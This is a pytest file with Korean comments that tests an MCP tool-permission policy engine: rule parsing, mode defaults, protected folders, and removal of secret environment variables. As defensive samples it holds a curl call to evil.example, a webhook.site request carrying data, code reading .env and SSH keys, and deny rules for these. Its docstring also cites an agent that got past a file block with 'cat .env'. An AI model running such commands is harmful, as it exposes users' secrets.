"""도구 보안 판정 — 순수 함수 쪽 (`app/mcp/exec_scan.py`, `app/mcp/policy.py`).

지키려는 것.

1. 규칙은 도구가 아니라 **행위**에 걸린다. filesystem 에서 막은 `.env` 는 sandbox 코드의
   `open('.env')` 로도 읽히지 않는다 (Antigravity 가 `cat .env` 로 뚫린 사례).
2. 판정 순서는 deny → ask → allow → 모드 기본값이고, 구체적인 allow 도 넓은 deny 를
   뚫지 못한다.
3. 고정 보호(MADO 설치 폴더 · 대화별 지식 그래프 · `.git` 쓰기)는 어떤 모드로도 풀리지 않는다.
4. MCP 서버는 MADO 의 비밀 환경변수를 물려받지 않는다.
"""

import os
from pathlib import Path

import pytest

from app.mcp.exec_scan import looks_like_path, scan_python
from app.mcp.policy import (
    ALLOW,
    ASK,
    DENY,
    EXEC,
    EXEC_FLAGGED,
    NET,
    OUTSIDE,
    UNKNOWN,
    WRITE,
    Policy,
    ToolMeta,
    denial_covers,
    describe_verdict,
    evaluate,
    grant_covers,
    hard_block,
    narrow_rules,
    parse_rule,
    parse_rules,
    profile_call,
    resolve_path,
    server_environment,
    stricter_mode,
    tool_always_denied,
    tool_outcome,
)

# 글자로만 다루므로 실제로 있을 필요는 없습니다. 운영체제의 절대 경로 모양만 따릅니다.
ROOT = Path(os.path.abspath("mado-install"))
WS = ROOT / "workspace"

SECRETS = ["read(**/.env)", "read(**/.ssh/**)", "net(webhook.site)"]


def _verdict(meta, args, mode="default", deny=(), ask=(), allow=(), grants=()):
    profile = profile_call(meta, args, WS, read_file=lambda _p: None)
    policy = Policy(
        mode=mode, deny=parse_rules(deny), ask=parse_rules(ask),
        allow=parse_rules(allow), grants=parse_rules(grants),
    )
    return evaluate(profile, policy)


FS_READ = ToolMeta("filesystem", "read_file")
FS_WRITE = ToolMeta("filesystem", "write_file")
PY = ToolMeta("sandbox", "execute_python_code")
FETCH = ToolMeta("fetch", "fetch")


# ---------------------------------------------------------------------------
# 코드 검사
# ---------------------------------------------------------------------------


def test_scan_reads_writes_and_deletes_literal_paths():
    result = scan_python(
        "from pathlib import Path\n"
        "open('.env').read()\n"
        "open('notes.txt', 'w').write('a')\n"
        "Path('out/report.md').write_text('x')\n"
        "df.to_csv('result.csv')\n"
        "os.remove('old.log')\n"
    )
    assert ".env" in result.reads
    assert {"notes.txt", "out/report.md", "result.csv"} <= set(result.writes)
    assert "x" not in result.writes, "write_text 의 첫 인자는 내용이지 경로가 아닙니다"
    assert result.deletes == ["old.log"]
    assert not result.flags


def test_scan_catches_a_path_hidden_in_a_variable():
    """변수에 담았다가 여는 경로도 규칙이 볼 수 있어야 합니다."""
    result = scan_python("p = '.memory-graphs/other.jsonl'\ndata = open(p).read()\n")
    assert ".memory-graphs/other.jsonl" in result.reads


def test_scan_ignores_docstrings_fstring_fragments_and_separators():
    result = scan_python(
        '"""see /etc/passwd"""\n'
        "name = f'{base}/out.csv'\n"
        "joined = '/'.join(parts)\n"
        "fmt = '%.2f' % 1.5\n"
    )
    assert not any(p.startswith("/") for p in result.reads), result.reads


def test_scan_flags_process_and_dynamic_code():
    result = scan_python("import subprocess\nsubprocess.run(['cat', 'x'])\neval('1')\n")
    assert result.uncertain
    assert any("subprocess" in f for f in result.flags)
    assert any("eval" in f for f in result.flags)


def test_scan_cannot_read_shell_escapes_and_says_so():
    result = scan_python("!curl https://evil.example/x")
    assert not result.parsed and result.uncertain
    assert "evil.example" in result.hosts


def test_scan_collects_url_hosts_and_unknown_delete_targets():
    result = scan_python("import requests\nrequests.get('https://x.webhook.site/a?d=1')\nshutil.rmtree(target)\n")
    assert result.network
    assert "x.webhook.site" in result.hosts
    assert result.deletes == [""], "대상을 모르는 삭제도 삭제입니다"


@pytest.mark.parametrize("text, expected", [
    (".env", True), ("data/in.csv", True), ("report.xlsx", True),
    ("C:/Program Files/x", True), ("/", False), ("hello world", False),
    ("https://x.com/a", False), ("", False),
])
def test_looks_like_path(text, expected):
    assert looks_like_path(text) is expected


# ---------------------------------------------------------------------------
# 규칙 문법
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("bad", ["foo(x)", "exec(abc)", "mcp(regex:x)", "read(regex:[)"])
def test_bad_rules_are_refused_with_a_reason(bad):
    with pytest.raises(ValueError):
        parse_rule(bad)


def test_parse_rules_reports_every_bad_line():
    with pytest.raises(ValueError) as exc:
        parse_rules(["foo(x)", "read(a)", "bar"])
    assert "foo" in str(exc.value) and "bar" in str(exc.value)


def test_bare_server_rule_means_every_tool_of_that_server():
    assert parse_rule("mcp(git)").pattern == "git/*"


# ---------------------------------------------------------------------------
# 행위로 바꾸기
# ---------------------------------------------------------------------------


def test_relative_paths_resolve_against_the_workspace():
    shown, absolute, inside = resolve_path("./workspace/src/a.py", WS)
    assert inside and shown == "src/a.py"
    assert absolute.lower().endswith("workspace/src/a.py")
    shown, _absolute, inside = resolve_path("../conf.json", WS)
    assert not inside and shown.lower().endswith("mado-install/conf.json")


def test_untrusted_remote_server_is_judged_by_tool_and_host_only():
    """원격 서버가 도구 이름을 `read_file` 로 지어도 읽기로 통과하지 못합니다."""
    meta = ToolMeta("evil", "read_file", trusted=False, remote_host="mcp.evil.example")
    verdict = _verdict(meta, {"path": "a.txt"})
    assert verdict.effect == ASK
    assert verdict.risk in (UNKNOWN, NET)
    assert "mcp(evil/read_file)" in verdict.suggestions


def test_loopback_remote_server_is_not_network():
    meta = ToolMeta("pair_slide", "slide_add", remote_host="127.0.0.1")
    assert _verdict(meta, {"name": "deck"}).effect == ALLOW


def test_trusted_annotations_decide_unknown_tools():
    read_only = ToolMeta("custom", "lookup", annotations={"readOnlyHint": True, "openWorldHint": False})
    assert _verdict(read_only, {}).effect == ALLOW
    # 명세 기본값: destructiveHint · openWorldHint 는 적지 않으면 True 입니다.
    vague = ToolMeta("custom", "do_it", annotations={"readOnlyHint": False})
    assert _verdict(vague, {}).effect == ASK


# ---------------------------------------------------------------------------
# 판정
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("mode, meta, args, expected", [
    ("default", FS_WRITE, {"path": "src/a.py"}, ALLOW),
    ("review", FS_WRITE, {"path": "src/a.py"}, ASK),
    ("read_only", FS_WRITE, {"path": "src/a.py"}, DENY),
    ("auto", FS_WRITE, {"path": "src/a.py"}, ALLOW),
    ("default", FS_READ, {"path": "src/a.py"}, ALLOW),
    ("read_only", FS_READ, {"path": "src/a.py"}, ALLOW),
    ("default", PY, {"code": "print(1 + 1)"}, ALLOW),
    ("default", PY, {"code": "import os\nos.system('dir')"}, ASK),
    ("default", FETCH, {"url": "https://docs.python.org/3/"}, ASK),
    ("auto", FETCH, {"url": "https://docs.python.org/3/"}, ALLOW),
    ("read_only", ToolMeta("memory", "create_entities"), {}, ALLOW),
    ("default", ToolMeta("sandbox", "install_python_packages"), {"packages": "polars"}, ASK),
])
def test_mode_defaults(mode, meta, args, expected):
    assert _verdict(meta, args, mode=mode).effect == expected


def test_a_secret_rule_covers_every_tool_that_can_reach_the_file():
    """한 줄의 규칙이 filesystem 과 sandbox 코드 양쪽을 막습니다."""
    assert _verdict(FS_READ, {"path": ".env"}, deny=SECRETS).effect == DENY
    code = "print(open('.env').read())"
    assert _verdict(PY, {"code": code}, deny=SECRETS).effect == DENY
    home_key = "open('C:/Users/me/.ssh/id_rsa').read()"
    assert _verdict(PY, {"code": home_key}, deny=SECRETS).effect == DENY


def test_restrictive_rules_spread_up_and_allow_rules_spread_down():
    assert _verdict(FS_WRITE, {"path": ".env"}, deny=["read(**/.env)"]).effect == DENY
    assert _verdict(FS_READ, {"path": "src/a.py"}, mode="read_only",
                    allow=["write(src/**)"]).effect == ALLOW
    # 아래로만 번집니다 — read 허용이 write 를 풀지는 않습니다.
    assert _verdict(FS_WRITE, {"path": "src/a.py"}, mode="review",
                    allow=["read(src/**)"]).effect == ASK


def test_deny_beats_a_more_specific_allow_and_ask_beats_allow():
    verdict = _verdict(FETCH, {"url": "https://a.webhook.site/x"},
                       deny=SECRETS, allow=["mcp(fetch/*)", "net(a.webhook.site)"])
    assert verdict.effect == DENY and verdict.rule == "net(webhook.site)"
    verdict = _verdict(ToolMeta("git", "git_commit"), {"repo_path": str(WS)},
                       ask=["mcp(git/git_commit)"], allow=["mcp(git/*)"])
    assert verdict.effect == ASK
    assert verdict.suggestions == [], "ask 규칙이 이기므로 '다음부터 묻지 않기' 는 효과가 없습니다"


def test_domain_rules_cover_subdomains_only():
    assert _verdict(FETCH, {"url": "https://docs.python.org"}, allow=["net(python.org)"]).effect == ALLOW
    assert _verdict(FETCH, {"url": "https://notpython.org"}, allow=["net(python.org)"]).effect == ASK


def test_session_grants_are_allow_rules():
    verdict = _verdict(FETCH, {"url": "https://pypi.org/simple"}, grants=["net(pypi.org)"])
    assert verdict.effect == ALLOW and verdict.source == "grant"


def test_suggestions_are_the_narrowest_rule_that_covers_the_call():
    verdict = _verdict(FS_WRITE, {"path": "src/a.py"}, mode="review")
    assert verdict.suggestions == ["write(src/a.py)"]
    verdict = _verdict(FETCH, {"url": "https://docs.python.org"})
    assert verdict.suggestions == ["net(docs.python.org)"]


def test_grant_covers_rejects_a_scope_that_misses_the_call():
    profile = profile_call(FETCH, {"url": "https://docs.python.org"}, WS)
    assert grant_covers(["net(python.org)"], profile, "default")
    assert not grant_covers(["net(evil.com)"], profile, "default")
    assert not grant_covers(["nonsense("], profile, "default")


def test_exec_verdict_carries_the_scan_findings():
    verdict = _verdict(PY, {"code": "import subprocess\nsubprocess.run(['ls'])"})
    assert verdict.risk == EXEC_FLAGGED
    assert any("subprocess" in r for r in verdict.reasons)


def test_writing_outside_the_workspace_asks():
    verdict = _verdict(PY, {"code": "open('C:/Windows/evil.txt', 'w').write('x')"})
    assert verdict.effect == ASK and verdict.risk == OUTSIDE


def test_tools_that_are_always_denied_leave_the_tool_list():
    policy = Policy(mode="read_only")
    assert tool_always_denied(FS_WRITE, policy)
    assert tool_always_denied(PY, policy)
    assert tool_always_denied(FS_READ, policy) is None
    assert tool_always_denied(FETCH, Policy(deny=parse_rules(["mcp(fetch)"])))
    assert tool_always_denied(FETCH, Policy()) is None


def test_stricter_mode_wins():
    assert stricter_mode("auto", "review") == "review"
    assert stricter_mode("default", None) == "default"
    assert stricter_mode("read_only", "auto") == "read_only"


# ---------------------------------------------------------------------------
# 고정 보호
# ---------------------------------------------------------------------------


def _hard(meta, args, workspace=WS, root=ROOT, protected=()):
    profile = profile_call(meta, args, workspace, read_file=lambda _p: None)
    return hard_block(profile, workspace, root, protected)


def test_the_install_folder_is_protected_but_the_workspace_inside_it_is_not():
    assert _hard(FS_READ, {"path": "../conf.json"})
    assert _hard(PY, {"code": "open('../.env').read()"})
    assert _hard(FS_WRITE, {"path": "src/a.py"}) is None


def test_a_workspace_at_the_install_root_does_not_unprotect_it():
    """세션 작업 공간을 설치 폴더로 잡아도 conf.json 은 도구 범위에 들어가지 않습니다."""
    assert _hard(FS_WRITE, {"path": "conf.json"}, workspace=ROOT)
    assert _hard(FS_WRITE, {"path": "app/main.py"}, workspace=ROOT)


def test_explicit_protected_files_are_blocked_anywhere():
    workspace = Path(os.path.abspath("elsewhere"))
    db = workspace / "multiagent.db"
    assert _hard(FS_READ, {"path": "multiagent.db"}, workspace=workspace, root=ROOT, protected=[db])


def test_other_conversations_memory_graphs_are_off_limits():
    assert _hard(FS_READ, {"path": ".memory-graphs/other.jsonl"})
    assert _hard(PY, {"code": "p = '.memory-graphs/other.jsonl'\nopen(p).read()"})


def test_git_internals_are_not_written_by_file_tools_but_git_tools_work():
    assert _hard(ToolMeta("sandbox", "write_workspace_file"),
                 {"filename": "./workspace/.git/hooks/pre-commit", "content": "x"})
    assert _hard(ToolMeta("sandbox", "append_workspace_file"),
                 {"filename": ".git/hooks/pre-commit", "content": "x"})
    assert _hard(FS_READ, {"path": ".git/config"}) is None, "읽기는 막지 않습니다"
    assert _hard(ToolMeta("git", "git_commit"), {"repo_path": str(WS), "message": "m"}) is None


# ---------------------------------------------------------------------------
# 비밀 환경변수
# ---------------------------------------------------------------------------


def test_servers_do_not_inherit_secrets_but_get_what_they_declare():
    parent = {
        "PATH": "x", "SYSTEMROOT": "C:/Windows", "MADO_ACCESS_TOKEN": "t",
        "LLM_API_KEY": "k", "OPENAI_API_KEY": "k", "AWS_SECRET_ACCESS_KEY": "s",
        "DB_PASSWORD": "p", "WORKSPACE_DIR": "w", "GITHUB_TOKEN": "g",
    }
    env = server_environment(parent, {"BRAVE_API_KEY": "declared"})
    assert env["PATH"] == "x" and env["SYSTEMROOT"] == "C:/Windows" and env["WORKSPACE_DIR"] == "w"
    for secret in ("MADO_ACCESS_TOKEN", "LLM_API_KEY", "OPENAI_API_KEY",
                   "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "GITHUB_TOKEN"):
        assert secret not in env, secret
    assert env["BRAVE_API_KEY"] == "declared", "서버 env 에 명시한 비밀은 넘어갑니다"


def test_write_and_exec_risks_are_what_the_modes_expect():
    assert _verdict(FS_WRITE, {"path": "a"}, mode="auto").risk == WRITE
    assert _verdict(PY, {"code": "x = 1"}, mode="auto").risk == EXEC


# ---------------------------------------------------------------------------
# 이 대화에서 거부
# ---------------------------------------------------------------------------


def test_session_denials_deny_and_say_it_was_the_user():
    verdict = _verdict(FETCH, {"url": "https://docs.python.org"}, mode="auto")
    assert verdict.effect == ALLOW
    profile = profile_call(FETCH, {"url": "https://docs.python.org"}, WS)
    verdict = evaluate(profile, Policy(mode="auto", denials=parse_rules(["net(python.org)"])))
    assert verdict.effect == DENY and verdict.source == "denial"
    assert "유저가 이 대화에서" in verdict.headline


def test_the_sandbox_append_tool_is_judged_as_a_write_to_its_file():
    """샌드박스 v0.8.0 의 덧붙이기 도구. 판정은 쓰기 도구와 같아야 합니다 — 모르는 도구로 두면
    인자의 경로를 보지 못합니다."""
    meta = ToolMeta("sandbox", "append_workspace_file")
    profile = profile_call(meta, {"filename": "slides/deck/index.tsx", "content": "x"}, WS)
    assert [(a.kind, a.target) for a in profile.actions if a.kind == "write"] == [
        ("write", "slides/deck/index.tsx")
    ]
    assert _verdict(meta, {"filename": "slides/deck/index.tsx", "content": "x"}).effect == ALLOW
    assert _verdict(meta, {"filename": "notes.md", "content": "x"}, mode="read_only").effect == DENY


def test_denials_beat_session_grants_and_allow_rules():
    profile = profile_call(FS_WRITE, {"path": "src/a.py"}, WS)
    policy = Policy(
        mode="auto", allow=parse_rules(["mcp(filesystem/*)"]),
        grants=parse_rules(["write(src/**)"]), denials=parse_rules(["write(src/a.py)"]),
    )
    assert evaluate(profile, policy).effect == DENY


def test_narrow_rules_come_from_arguments_not_from_code():
    profile = profile_call(PY, {"code": "open('data.csv').read()"}, WS)
    assert narrow_rules(profile) == ["mcp(sandbox/execute_python_code)"]
    profile = profile_call(FS_WRITE, {"path": "src/a.py"}, WS)
    assert narrow_rules(profile) == ["write(src/a.py)"]
    remote = ToolMeta("jira", "create_issue", trusted=False, remote_host="jira.corp")
    assert narrow_rules(profile_call(remote, {}, WS)) == ["net(jira.corp)"]


def test_denial_covers_only_scopes_that_block_the_call():
    profile = profile_call(FETCH, {"url": "https://docs.python.org"}, WS)
    assert denial_covers(["net(python.org)"], profile)
    assert denial_covers(["mcp(fetch)"], profile)
    assert not denial_covers(["net(evil.com)"], profile)
    assert not denial_covers(["broken("], profile)


def test_a_tool_wide_denial_removes_the_tool_from_the_list():
    assert tool_always_denied(FETCH, Policy(denials=parse_rules(["mcp(fetch/fetch)"])))


# ---------------------------------------------------------------------------
# 보여줄 말 — 결과 하나, 판정 한 줄
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("status, security, outcome, verdict", [
    ("success", {"decision": "allow", "rule": "mode:default"}, "success", "자동 허용 · 기본 모드"),
    ("success", {"decision": "allow", "rule": "session:net(python.org)"}, "success",
     "자동 허용 · 이 대화 규칙 net(python.org)"),
    ("error", {"decision": "approved", "rule": "once", "approver": "local"}, "error",
     "유저 승인 · 이번만 · 서버 PC"),
    ("success", {"decision": "approved", "rule": "always:net(pypi.org)", "approver": "local"}, "success",
     "유저 승인 · conf.json 규칙으로 등록 net(pypi.org) · 서버 PC"),
    ("denied", {"decision": "deny", "rule": "read(**/.env)"}, "blocked", "규칙 차단 · read(**/.env)"),
    ("denied", {"decision": "deny", "rule": "mode:read_only"}, "blocked", "모드 차단 · 읽기 전용 모드"),
    ("error", {"decision": "hard", "rule": "문서 형식"}, "blocked", "고정 보호 · 문서 형식"),
    ("denied", {"decision": "rejected", "rule": "session:write(a.md)", "approver": "remote"}, "blocked",
     "유저 거부 · 이 대화 규칙으로 등록 write(a.md) · 원격"),
    ("denied", {"decision": "rejected", "rule": "session:write(a.md)"}, "blocked",
     "유저 거부 · 이 대화 규칙 write(a.md)"),
    ("denied", {"decision": "timeout"}, "blocked", "응답 없음 · 정해진 시간 안에 답이 없었음"),
    ("error", {}, "error", ""),
])
def test_one_outcome_and_one_verdict_line(status, security, outcome, verdict):
    assert tool_outcome(status, security) == outcome
    assert describe_verdict(security) == verdict
